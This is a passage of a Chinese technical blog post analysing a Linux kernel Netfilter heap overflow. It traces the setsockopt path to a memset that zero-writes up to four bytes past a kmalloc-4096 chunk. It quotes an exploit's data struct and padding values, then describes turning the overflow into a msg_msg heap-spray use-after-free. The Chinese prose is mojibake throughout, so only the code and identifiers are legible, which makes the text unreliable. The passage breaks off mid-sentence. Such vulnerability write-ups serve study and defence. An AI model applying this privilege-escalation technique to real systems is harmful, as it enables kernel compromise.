(anquanke.com)](https://www.anquanke.com/post/id/254027#h2-1)\n\nç›¸å…³çš„`Netfilter`åˆ†æå°±ä¸åšäº†ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥çœ‹çœ‹`bsauce`å¸ˆå‚…çš„ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨æ•°æ®çš„ä¼ è¾“è¿‡ç¨‹çš„ä¸€äº›ä¸œè¥¿ã€‚\n\né€šè¿‡`Netfilter`çš„`setsockopt`ç³»ç»Ÿè°ƒç”¨ï¼Œä¼ å…¥ç”¨æˆ·æ•°æ®`&data`ï¼Œå¯ä¾æ®è¯¥`&data`ä¸­çš„ç›¸å…³æ•°æ®è¿›è¡Œä¸åŒå¤§å°çš„å †å—ç”³è¯·ã€‚å®Œæˆç”³è¯·åï¼Œè¿˜ä¼šå¯¹è¯¥å †å—è¿›è¡Œä¸€å®šçš„å¤„ç†ï¼Œå…¶ä¸­å°±æœ‰å‘å †å—æœ«å°¾å¡«å……æ•°æ®çš„æ“ä½œã€‚\n\n```c\nmemset(t->data + target->targetsize, 0, pad);\n```\n\nå…¶ä¸­`t->data+target->targetsize`å³ä¸ºç”³è¯·çš„å †å—ä¸Šæœ«å°¾å¤„çš„æŸä¸ªåœ°å€ï¼Œ`pad`ä¸ºå¦‚ä¸‹å®šä¹‰\n\n```c\npad = XT_ALIGN(target->targetsize) - target->targetsize;\n```\n\nå…¶å®`pad`çš„å€¼å³ä¸º`8 - (target->targetsize mod 8)`ï¼Œå°±æ˜¯æ‰€è°“çš„8å­—èŠ‚å¯¹é½ã€‚\n\nå¹¶ä¸”`t->data`çš„åœ°å€åç§»å’Œ`target->targetsize`çš„å€¼éƒ½å¯è¢«æˆ‘ä»¬ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­˜åœ¨å †å—æº¢å‡ºå†™0çš„æ“ä½œäº†ï¼Œè¿™é‡Œæœ€å¤šæº¢å‡º4ä¸ªå­—èŠ‚å¡«å……ä¸º0ã€‚\n\nä¸‹é¢æ˜¯å…·ä½“çš„å…³é”®å‡½æ•°è°ƒç”¨é“¾å’Œç›¸å…³åˆ†æ\n\n## 1.nf_setsockopt() \n\nå¥æŸ„å®šä¹‰\n\n```C\n//v5.11.14 net/ipv4/netfilter/ip_tables.c\nstatic struct nf_sockopt_ops ipt_sockopts = {\n....\n\t.get\t\t= do_ipt_get_ctl,\n....\n};\n```\n\nè¿™æ ·åˆ°è°ƒç”¨`setsockopt`ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°±ä¼šè°ƒç”¨åˆ°`do_ipt_get_ctl`å‡½æ•°ã€‚\n\n## 2.do_ipt_set_ctl()\n\n- å‚æ•°ï¼š\n\n  ```c\n  (struct sock *sk, int cmd, sockptr_t arg, unsigned int len)\n  ```\n\n  è°ƒè¯•å¦‚ä¸‹![image-20220501113945278](https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png)\n\n  è¿™ä¸ª`&data`å³ä¸ºç”¨æˆ·ä¼ å…¥çš„ï¼Œèµ‹å€¼ç»™`sockptr_t arg`ï¼Œä»è€Œä¾æ®`sockptr_t arg`æ¥è¿›è¡Œå †å—ç”³è¯·å’Œç›¸å…³çš„æ¼æ´å¡«å……æ“ä½œã€‚\n\n- åœ°å€ï¼š`0xffffffff81b0bd20`\n\n- ä»‹ç»ï¼šè¯¥å‡½æ•°ç”±`nf_sockopt_ops ipt_sockopts`è¿›è¡Œå¥æŸ„å®šä¹‰\n\n  ```c\n  static struct nf_sockopt_ops ipt_sockopts = {\n  ....\n  \t.get\t\t= do_ipt_get_ctl,\n  ....\n  };\n  ```\n\n  å³ç³»ç»Ÿè°ƒç”¨`setsockopt`å®é™…è°ƒç”¨åˆ°ä¸æ¼æ´æ–¹é¢æœ‰å…³çš„æœ€æ—©çš„å‡½æ•°ï¼Œä¼ å…¥çš„`sockptr_targ`å³ä¸ºç”¨æˆ·å‚æ•°`&data`ï¼Œåç»­ä¼šè°ƒç”¨åˆ°`compat_do_replace`ï¼Œä¼ å…¥`sockptr_t arg`\n\n## 3.compat_do_replace() \n\né€šè¿‡`_copy_from_user`å¤åˆ¶`&data`çš„`0x5c`å­—èŠ‚ç»™`tmp`\n\n- å‚æ•°ï¼š\n\n  ```c\n  (struct net *net, sockptr_t arg, unsigned int len)\n  ```\n\n- åœ°å€ï¼š`0xffffffff81b0baf0`\n\n- ä»‹ç»ï¼š\n\n  - ä¸»è¦å…³æ³¨å˜é‡ï¼š\n\n    ```c\n    //ä¼ å…¥çš„\n    sockptr_t arg;\n    \n    //è‡ªå®šä¹‰çš„\n    struct compat_ipt_replace tmp;//ä¿å­˜size\n    struct xt_table_info *newinfo;\n    ```\n\n  è°ƒç”¨`translate_compat_table()`ï¼Œä¼ å…¥æœ¬å‡½æ•°å®šä¹‰çš„`tmp`ä½œä¸º`compatr`ï¼Œè¯¥å˜é‡`tmp`ç”±å‡½æ•°`copy_from_sockptr(&tmp, arg, sizeof(tmp))`è¿›è¡Œèµ‹å€¼\n\n  - ç›¸å…³å‡½æ•°é“¾ï¼š`copy_from_sockptr->copy_from_sockptr->copy_from_sockptr_offset->copy_from_user`\n\n  ```c\n  //v5.11.14 /include/linux/sockptr.h\n  \n  static inline int copy_from_sockptr_offset(void *dst, sockptr_t src,\n  \t\tsize_t offset, size_t size)\n  {\n  \tif (!sockptr_is_kernel(src))\n  \t\treturn copy_from_user(dst, src.user + offset, size);\n  \tmemcpy(dst, src.kernel + offset, size);\n  \treturn 0;\n  }\n  ```\n\n  è¿™é‡Œçš„`dst`å³ä¸º`tmp`ï¼Œ`src`å³ä¸º`arg`ï¼Œä¹Ÿå°±æ˜¯ä¼šä¾æ®`arg(&data)`çš„å†…å®¹æ¥ç»™`tmp`èµ‹å€¼ã€‚å³æœ€åçš„`compatr`çš„æ¥æºä¸ºä¸Šè¿°æåˆ°çš„`sockptr_t arg`ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°`&data`ã€‚\n\n  ä»`&data`ä¸­å¤åˆ¶`0x5c(sizeof(struct compat_ipt_replace))`å¤§å°çš„ç»™åˆ°`tmp(compatr)`ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º\n\n  ```c\n  //v5.11.14 /net/ipv4/netfilter/ip_tables.c\n  static int\n      compat_do_replace(struct net *net, sockptr_t arg, unsigned int len)\n  {\n      //.....\n      if (copy_from_sockptr(&tmp, arg, sizeof(tmp)) != 0)\n          return -EFAULT;\n      ///....\n      //è¿™é‡Œçš„tmp.sizeå³ä¸º0xfb6ï¼Œä¼ å…¥çš„data.replace.sizeï¼Œä¹Ÿæ˜¯ç”³è¯·äº†å †å—çš„ã€‚\n      //ä¸è¿‡è¿™ä¸ªå †å—ä¸ç”¨å¤ªè¿‡å…³æ³¨ï¼Œä½†æ˜¯è¿™ä¸ªä¸èƒ½éšä¾¿è®¾ç½®ï¼Œä¸ç„¶ä¼šåœ¨å¦‚ä¸‹æ£€æŸ¥å‡ºé”™è¯¯\n      //ç„¶åè·³è½¬out_unlockä»è€Œæ— æ³•è¿›å…¥æ¼æ´ç‚¹\n      /*\n      //translate_compat_tableå‡½æ•°ä¸­\n      //Walk through entries, checking offsets. \n  \txt_entry_foreach(iter0, entry0, compatr->size) {\n  \t\tret = check_compat_entry_size_and_hooks(iter0, info, &size,\n  \t\t\t\t\t\t\tentry0,\n  \t\t\t\t\t\t\tentry0 + compatr->size);\n  \t\tif (ret != 0)\n  \t\t\tgoto out_unlock;\n  \t\t++j;\n  \t}\n  \n      */\n      //éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªnewinfoå’Œä¸‹é¢å‡½æ•°ä¸­çš„newinfoä¸æ˜¯åŒä¸€ä¸ª\n      newinfo = xt_alloc_table_info(tmp.size);\n  \t//......\n      ret = translate_compat_table(net, &newinfo, &loc_cpu_entry, &tmp);\n      //.....\n  }\n  ```\n  \n  å¤åˆ¶çš„è¿™äº›æ•°æ®ä¸­å°±åŒ…å«å®šä¹‰å¥½çš„sizeï¼Œç”¨æ¥å®Œæˆä¹‹åçš„å †å—ç”³è¯·ã€‚\n\n## 4.translate_compat_table()  \n\n- å‚æ•°ï¼š\n\n  ```c\n  (struct net *net,struct xt_table_info **pinfo,void **pentry0,const struct compat_ipt_replace *compatr)\n  ```\n\n- åœ°å€ï¼š`0xffffffff81b0b3e0`\n\n- ä»‹ç»ï¼š\n\n  - ä¸»è¦å…³æ³¨å˜é‡ï¼š\n\n    ```c\n    //ä¼ å…¥çš„\n    const struct compat_ipt_replace *compatr;\n    \n    //è‡ªå®šä¹‰çš„\n    unsigned int size;\n    struct xt_table_info *newinfo;\n    void *pos, *entry1;\n    struct compat_ipt_entry *iter0;\n    ```\n\n  - `size`ï¼š`size = compatr->size;`\n\n  - `newinfo`ï¼šä¾æ®`size`å³ä¸Šè¿°çš„`compatr->size`ç”³è¯·å †å—ï¼Œæ¼æ´ç‚¹å°±å‡ºåœ¨è¿™ä¸ªç”³è¯·çš„å †å—ä¸Šé¢ã€‚\n\n    ```c\n    translate_compat_table(struct net *net,\n                           struct xt_table_info **pinfo,\n                           void **pentry0,\n                           const struct compat_ipt_replace *compatr)\n    {\n        //.....\n        size = compatr->size;\n        //....\n        //è¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚\n        newinfo = xt_alloc_table_info(size);\n        //.....\n    }\n    ```\n  \n    é€šè¿‡`xt_alloc_table_info`æ¥ç”³è¯·å †å—ï¼Œå…¶ä¸­æœ‰å¦‚ä¸‹ä»£ç \n  \n    ```c\n    //v5.11.14 /net/netfilter/x_tables.c\n    struct xt_table_info *xt_alloc_table_info(unsigned int size)\n    {\n    \tstruct xt_table_info *info = NULL;\n    \tsize_t sz = sizeof(*info) + size;//åŠ ä¸Š0x40å¤§å°\n    \n    \tif (sz < sizeof(*info) || sz >= XT_MAX_TABLE_SIZE)\n    \t\treturn NULL;\n    \t//å®é™…ç”³è¯·çš„å †å—å¤§å°ä¸º0xffe,å³kmalloc-4096ï¼Œè¿™ä¸ªå †å—å°±æ˜¯æ¼æ´å †å—äº†ã€‚\n        //ç»“æ„ä¸ºstruct xt_table_info\n    \tinfo = kvmalloc(sz, GFP_KERNEL_ACCOUNT);\n    \tif (!info)\n    \t\treturn NULL;\n    \n    \tmemset(info, 0, sizeof(*info));\n    \tinfo->size = size;\n    \treturn info;\n    }\n    ```\n  \n    å¯ä»¥çœ‹åˆ°ä½¿ç”¨`kvmalloc`ï¼Œç”³è¯·æ ‡å¿—ä¸º`GFP_KERNEL_ACCOUNT`ï¼Œå¹¶ä¸”`XT_MAX_TABLE_SIZE`å®šä¹‰å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯åœ¨kmalloc-512åˆ°kmalloc-8192\n  \n    ```\n    #define XT_MAX_TABLE_SIZE\t(512 * 1024 * 1024)\n    ```\n  \n  - `pos/entry1`ï¼š\n  \n    ```c\n    entry1 = newinfo->entries;\n    pos = entry1;\n    ```\n  \n    å³`pos/entry1`çš„å€¼ä¸º`newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)`\n  \n  - è°ƒç”¨å¦‚ä¸‹å‡½æ•°è¿›è¡Œä¸‹ä¸€æ­¥ï¼š\n  \n    ```c\n    compat_copy_entry_from_user(iter0, &pos, &size,\n    \t\t\t\t\t    newinfo, entry1);\n    ```\n  \n    \n\n\n\n## 5.compat_copy_entry_from_user()\n\n- å‚æ•°ï¼š\n\n  ```c\n  (struct compat_ipt_entry *e, void **dstptr,\n  \t\t\t    unsigned int *size,\n  \t\t\t    struct xt_table_info *newinfo, unsigned char *base)\n  ```\n\n- åœ°å€ï¼šä¸å¤ªæ¸…æ¥š\n\n- ä»‹ç»ï¼š\n\n  - ä¸»è¦å…³æ³¨å˜é‡ï¼š\n\n    ```c\n    //ä¼ å…¥çš„\n    //å³ä¿å­˜posçš„æ ˆåœ°å€ï¼Œå€¼ä¸ºnewinfo->entries(newinfo_addr+0x40)\n    void **dstptr;  \n    unsigned int *size;\n    struct xt_table_info *newinfo;\n    \n    ```\n  \n  - ç›¸å…³æ“ä½œï¼š\n\n    ```c\n    compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,\n                                unsigned int *size,\n                                struct xt_table_info *newinfo, unsigned char *base)\n    {\n        //....\n        //å³posåŠ ä¸Š0x70ï¼Œå€¼ä¸ºnewinfo_addr+0x40+0x70\n        *dstptr += sizeof(struct ipt_entry);\n        *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);\n        xt_ematch_foreach(ematch, e)\n    \t\txt_compat_match_from_user(ematch, dstptr, size);\n        //.....\n        xt_compat_target_from_user(t, dstptr, size);\n        //.....\n    }\n    ```\n  \n\n\n\n## 6.xt_compat_match_from_user()\n\nè¿™ä¸ªå‡½æ•°å’Œæ¥ä¸‹æ¥çš„æ¼æ´å‡½æ•°`xt_compat_target_from_user`å¯ä»¥è¯´åŸºæœ¬ä¸€è‡´ï¼Œè§‚å¯Ÿä¸‹å›¾å³å¯çœ‹åˆ°ï¼Œå…·ä½“ç”¨æ¥å¹²ä»€ä¹ˆä¸å¤ªæ¸…æ¥šï¼Œä½†æ˜¯ä½œç”¨ä¹Ÿæ˜¯ç›¸å…³çš„padå¡«å……`newinfo`ä¸Šçš„æ•°æ®ã€‚æ‰“äº†ä¸€ä¸ªå¾ªç¯`xt_ematch_foreach`ï¼Œåœ¨æˆ‘ä»¬å…³æ³¨çš„è¿™ä¸ªæ¼æ´é‡Œï¼Œå…¶ä½œç”¨å°±åªæ˜¯ä½¿å¾—`*dstptr + n * msize`ï¼Œä¹Ÿå°±æ˜¯åœ¨æˆ‘ä»¬å…³å¿ƒçš„æœ€ç»ˆå€¼ä¸º`newinfo_addr+0x40+0x70+n * msize`ï¼Œä»è€Œä½¿å¾—åœ¨è¿›å…¥`xt_compat_target_from_user`ä¹‹å‰ï¼Œ`*dstptr`ä¸Šçš„å †å—åœ°å€å·²ç»ç§»åŠ¨åˆ°æœ«å°¾äº†ã€‚\n\n<img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png\" alt=\"image-20220507214923917\" style=\"zoom: 80%;\" />    \t<img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png\" alt=\"image-20220507214947982\" style=\"zoom: 80%;\" />\n\nåšäº†ä¸€ä¸ªæ•°æ®å¯¹æ¯”ï¼š\n\n```\nnewinfoï¼š\t\t\t\t0xffff888006a2a000\ntï¼š\t\t\t\t\t\t0xffff888006a2afda\nt->dataï¼š\t\t\t\t0xffff888006a2affa\ntarget->targetsizeï¼š\t\t0x4\ndstptrï¼š\n\txt_compat_match_from_userçš„æ—¶å€™ï¼š\n\t\t0xffffc900002b7ad0->0xffff888006a2a0b0\n\txt_compat_target_from_userçš„æ—¶å€™ï¼š\n\t\t0xffffc900002b7ad0->0xffff888006a2afda\n```\n\nä¹Ÿå°±æ˜¯è¯´ç»è¿‡`xt_compat_match_from_user`å‡½æ•°ä¹‹åï¼Œä¿å­˜åœ¨`*dstptr`ä¸Šçš„æ¼æ´å †çš„åœ°å€å·²ç»åŠ ä¸Šäº†`0xf2a`ã€‚\n\n\n\n## 6.xt_compat_target_from_user()   \n\nç»ˆäºæ¥åˆ°æœ€åçš„æ¼æ´å‡½æ•°\n\n- å‚æ•°ï¼š\n\n  ```c\n  (struct xt_entry_target *t, void **dstptr,\n  \t\t\t\tunsigned int *size)\n  ```\n\n- åœ°å€ï¼š`0xFFFFFFFF81A82F75`\n\n- ä»‹ç»ï¼š\n\n  - ä¸»è¦å…³æ³¨å˜é‡\n\n    ```c\n    //ä¼ å…¥çš„\n    struct xt_entry_target *t;\n    void **dstptr;\n    unsigned int *size;\n    \n    //è‡ªå®šä¹‰çš„\n    const struct xt_target *target = t->u.kernel.target;\n    int pad, off = xt_compat_target_offset(target);\n    ```\n\n  - ç›¸å…³æ“ä½œï¼š\n\n    ```c\n    void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,\n    \t\t\t\tunsigned int *size)\n    {\n    \tconst struct xt_target *target = t->u.kernel.target;\n    \tint pad, off = xt_compat_target_offset(target);\n    \t//.....\n        //å³è·å–æŒ‡é’ˆä¸ºnewinfo+0x40+0x70+0xf2a\n    \tt = *dstptr;\n        //.....\n        //è¿›è¡Œ8å­—èŠ‚å¯¹é½\n    \tpad = XT_ALIGN(target->targetsize) - target->targetsize;\n    \tif (pad > 0)\n            //target->targetsizeä¸º4ï¼Œåˆ™æœ€ç»ˆä¼ å…¥çš„åœ°å€ä¸º\n            //newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe\n            //åŒæ—¶padåœ¨ç»è¿‡å¯¹é½ä¹‹åä¹Ÿä¸º4,é‚£ä¹ˆå°±æº¢å‡º2ä¸ªå­—èŠ‚\n    \t\tmemset(t->data + target->targetsize, 0, pad);\n        //.....\n    \n    }\n    ```\n\n\n\n## æ€»ç»“\n\né€šè¿‡ä¸Šè¿°åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®è¯¥æ¼æ´çš„æˆå› å°±æ˜¯\n\n### (1)æ§åˆ¶å †å—å¤§å°å’Œåç§»\n\né€šè¿‡æ§åˆ¶ä¼ å…¥çš„`&data`ä¸­çš„`pad`çš„å¤§å°æ¥æ§åˆ¶ç”³è¯·çš„å †å—çš„å¤§å°å’Œ`t->data`çš„ç›¸å¯¹åç§»åœ°å€\n\n```c\n  struct __attribute__((__packed__)) {\n    struct ipt_replace replace;         // 0x60\n    struct ipt_entry entry;            // 0x70\n    struct xt_entry_match match;         // 0x20\n    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];     \n    struct xt_entry_target target;      // 0x20\n  } data = {0};\n```\n\nä¾‹å­ï¼š\n\næ¯”å¦‚bsauceå¸ˆå‚…æä¾›çš„EXPä¸­çš„padå¦‚ä¸‹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯`kmalloc-4096`ï¼š\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; \n```\n\né‚£ä¹ˆæˆ‘ä»¬å°è¯•ä½¿ç”¨`kmalloc-2048`ï¼Œåœ¨ä»£ç ä¸­å‡å»0x800å¾—åˆ°å¦‚ä¸‹ï¼š\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 - 0x800];\n```\n\næ–­ç‚¹æ‰“åœ¨`xt_alloc_table_info`ï¼Œåœ¨ç¬¬äºŒæ¬¡çš„`xt_alloc_table_info`ç”³è¯·æ¼æ´å †å—å¤„ï¼ŒæŸ¥çœ‹ä¸‹CPU0çš„`kmalloc-2048`ä¸­`freelist`ä¸­çš„å †å—ã€‚\n\n![image-20220508200120767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png)\n\nç„¶å`finish`å½“å‰å‡½æ•°ï¼ŒæŸ¥çœ‹raxç”³è¯·åˆ°çš„å †å—ï¼Œå³ä¸º`freelist`ä¸­çš„ç¬¬ä¸€ä¸ªå †å—\n\n![image-20220508200155851](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png)\n\nå¯ä»¥çœ‹åˆ°æ˜¯ä»CP0çš„`kmalloc-2048`ä¸­ç”³è¯·å¾—åˆ°çš„ï¼Œä¹‹ååœ¨`call memset`çš„æ¼æ´ç‚¹æ‰“ä¸‹æ–­ç‚¹ï¼ŒæŒ‰cç»§ç»­è¿è¡Œï¼Œæ–­ä¸‹æ¥\n\n![image-20220508200407354](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png)\n\nå¯ä»¥çœ‹åˆ°ä»ç„¶è¿˜æ˜¯è¯¥æ¼æ´å †å—ï¼Œå¹¶ä¸”ç›¸å…³çš„åœ°å€ä¹Ÿç±»ä¼¼çš„ï¼Œpadä¸º0x4ï¼Œæ‰€ä»¥è¿˜æ˜¯å­˜åœ¨æ¼æ´ç‚¹çš„ã€‚\n\nä¸è¿‡å…·ä½“çš„ç»†èŠ‚æœ‰ç‚¹ä¸å¤ªæ¸…æ¥šï¼Œåç»­è¿˜å¾—è¡¥ä¸€è¡¥`Netfilter`çš„ç›¸å…³çŸ¥è¯†ã€‚\n\n\n\n### (2)æ§åˆ¶å¡«å……pad\n\né€šè¿‡æ§åˆ¶ä¼ å…¥çš„`data.target.u.user.revision`æ¥æ§åˆ¶`target->targetsize`\n\n```c\ndata.target.u.user.revision = 1;\n```\n\nä¸åŒçš„`version`æ§åˆ¶ä¸åŒçš„`target->targetsize`ã€‚\n\nè¿™é‡Œç»è¿‡æˆ‘è‡ªå·±çš„å®é™…è°ƒè¯•ï¼Œæ„Ÿè§‰bsauceå¸ˆå‚…è¯´çš„æœ‰ç‚¹å°é—®é¢˜ã€‚æ¼æ´ç‚¹åº”è¯¥æ˜¯å‡ºåœ¨ä¸Šè¿°çš„`t->daii`åœ°å€æ²¡æœ‰0x8å¯¹é½çš„æ—¶å€™ï¼Œå¹¶ä¸”`target->size`ä¹Ÿæ²¡æœ‰0x8å¯¹é½çš„æƒ…å†µä¸‹ã€‚\n\næ­¤å¤–ï¼Œä¸åº”è¯¥åªæ˜¯2å­—èŠ‚æº¢å‡ºï¼Œæœ€å¤šåº”è¯¥å¯ä»¥åˆ°è¾¾4å­—èŠ‚æº¢å‡ºï¼Œå¦‚ä¸‹è®¾ç½®\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 + 0x2]; \n```\n\nè¿™æ ·å¯ä»¥æº¢å‡º4ä¸ªå­—èŠ‚å†™0ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\n\n![image-20220508204003227](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png)\n\nå¦‚æœå†åŠ padçš„è¯å°±ä¼šå¯¼è‡´ç”³è¯·å‡º`kmalloc-8192`çš„å †å—äº†\n\n\n\n# äºŒã€æ¼æ´åˆ©ç”¨\n\n## 1.æº¢å‡ºè½¬åŒ–UAF\n\nè¿™é‡Œæ¶‰åŠåˆ°ä¹‹å‰æåˆ°çš„`msg_msg`ç»“æ„ä½“åˆ©ç”¨ã€‚\n\n### (1)å †å–·å†…å­˜å¸ƒå±€\n\né¦–å…ˆä½¿ç”¨`msgget`ç”³è¯·å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œç„¶åå¾€æ¯ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œä¸€æ¡ä¸»æ¶ˆæ¯`0x1000`ï¼Œä¸€æ¡è¾…åŠ©æ¶ˆæ¯`0x400`ã€‚è¿™é‡Œå‘é€æ¶ˆæ¯æ—¶éœ€è¦æ³¨æ„ä¸‹ï¼Œå…ˆéå†æ¯ä¸ªé˜Ÿåˆ—å‘é€ä¸»æ¶ˆæ¯ï¼Œç„¶åå†éå†æ¯ä¸ªé˜Ÿåˆ—å‘é€è¾…åŠ©æ¶ˆæ¯ã€‚è¿™æ ·è¿›è¡Œå †å–·æ„é€ åï¼Œå…¶ä¸­å°±ä¼šæœ‰éƒ¨åˆ†çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„ä¸»æ¶ˆæ¯è¿æˆä¸€æ•´å—åœ°å€è¿ç»­çš„å†…å­˜ï¼Œ**è¾…åŠ©æ¶ˆæ¯ä¹Ÿéœ€è¦åœ°å€è¿æˆä¸€æ•´å—ï¼Œæ–¹ä¾¿åç»­æ³„éœ²åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†å¥½çœ‹å°±æ²¡æœ‰è¿ä¸€èµ·**ã€‚æ¯”å¦‚è¿™é‡Œç”³è¯·ä¸‰ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæœ€ç»ˆå½¢æˆç±»ä¼¼çš„å¦‚ä¸‹å¸ƒå±€\n\n![image-20220513110107919](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png)\n\nå½“ç„¶è¿™é‡Œæ¯æ¡`0x1000`çš„ä¸»æ¶ˆæ¯ä¸­è¿˜æœ‰å‡ ä¸ª`struct msg_msgseg*`æ²¡æœ‰ç”»å‡ºæ¥\n\n### (2)æ¼æ´æº¢å‡ºæ„é€ UAF\n\nè¿™é‡Œæˆ‘ä»¬å…ˆé‡Šæ”¾ä¾‹å­ä¸­çš„ç¬¬äºŒæ¡ä¸»æ¶ˆæ¯ï¼Œè™½è¯´åœ¨ä¸»æ¶ˆæ¯ä¸­æ˜¯ç”±4ä¸ª`kmalloc(0x400)`ç”³è¯·å‡ºæ¥çš„4ä¸ªå †å—ï¼Œä½†æ˜¯å¦‚æœéƒ½é‡Šæ”¾ä¹‹åï¼Œå†…å­˜çš„å›æ”¶æœºåˆ¶å‘ç°è¿™å››ä¸ªåœ°å€è¿ç»­ä¸”éƒ½è¢«é‡Šæ”¾ï¼Œé‚£ä¹ˆå°±ä¼šå½’å¹¶æˆä¸€é¡µ`page`è¿˜ç»™`Slub`åˆ†é…å™¨ï¼Œå…¶å®å°±æ˜¯`kmalloc-4096`ã€‚ï¼ˆé‡Œé¢ç®—æ³•å¾ˆå¤æ‚ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œåé¢å†æ¥ç†æ¸…æ¥šã€‚ï¼‰ä¹‹åå†ç”³è¯·`0x1000`å¤§å°çš„å †å—ï¼Œå°±ä¼šä¼˜å…ˆä»è¿™é‡Œå–ã€‚\n\n![image-20220513110346186](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png)\n\nç„¶åæˆ‘ä»¬ä½¿ç”¨æ¼æ´ï¼Œè°ƒç”¨`socketopt`æ¥ç”³è¯·ä¸€ä¸ª`0x1000`çš„`xt_table_info`ï¼Œå°±ä¼šå æ®åˆ°æˆ‘ä»¬åˆšåˆšé‡Šæ”¾çš„`0x1000`å¤§å°çš„å †å—ä¸Šã€‚(è¿™ä¸ªå‰é¢æˆ‘ä»¬åˆ†æ`socketopt`ä¼šç”³è¯·ä¸¤ä¸ª`0x1000`å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹åå°±æ˜¯å¤šé‡Šæ”¾å‡ æ¡ä¸»æ¶ˆæ¯å³å¯)è¿™æ ·åœ¨å æ®ä¹‹åï¼Œå‘ç”Ÿ2å­—èŠ‚æº¢å‡ºå†™0ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„`msg_msg`å¤´éƒ¨ç»“æ„çš„`struct list_head m_list.next`æŒ‡é’ˆï¼Œä»è€Œä½¿å¾—å…¶æŒ‡å‘å…¶ä»–ä½ç½®ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ï¼Œç”±äºè¾…åŠ©æ¶ˆæ¯ä¹Ÿæ˜¯å †å–·å½¢å¼ï¼Œä¸”å¤§å°ä¸º`0x400`ï¼Œé‚£ä¹ˆæº¢å‡ºä¸¤å­—èŠ‚å†™0å°±å¯èƒ½å°†è¯¥`next`æŒ‡é’ˆæŒ‡å‘å…¶ä»–çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä»è€Œé€ æˆä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å…±å­˜ä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ã€‚\n\n![image-20220513110927931](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png)\n\næ¯”å¦‚å›¾ä¸­æ¶ˆæ¯é˜Ÿåˆ—3ä¸­çš„ä¸»æ¶ˆæ¯å¤´éƒ¨çš„`struct list_head m_list.next`å³è¢«ä¿®æ”¹(é»‘è‰²ä¸ºæº¢å‡º2å­—èŠ‚å†™0)ï¼Œå¦‚çº¢è‰²ç®­å¤´æ‰€ç¤ºæŒ‡å‘äº†æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè¿™æ ·æ¶ˆæ¯é˜Ÿåˆ—1å’Œæ¶ˆæ¯é˜Ÿåˆ—3éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†å †å—`overlap`ã€‚ä¹‹åæˆ‘ä»¬é‡Šæ”¾æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè€Œæ¶ˆæ¯é˜Ÿåˆ—3ä»ç„¶æŒ‡å‘è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†UAFã€‚\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png)\n\nğŸ”ºæ³¨ï¼šåœ¨å®é™…çš„åˆ©ç”¨é‡Œï¼Œéœ€è¦è¿›è¡Œå †å–·å¸ƒå±€ï¼Œç”³è¯·å¾ˆå¤šçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨`MSG_COPY`æ ‡å¿—ä½æ¥è¿›è¡Œæ¶ˆæ¯è¯»å–ã€‚åˆ©ç”¨æ­¤æ ‡å¿—ä½è¯»å–æ¶ˆæ¯ä½†ä¸é‡Šæ”¾å †å—ï¼Œç„¶åå€ŸåŠ©å‘é€æ¶ˆæ¯æ—¶è‡ªå·±ç•™ä¸‹çš„ç´¢å¼•æ 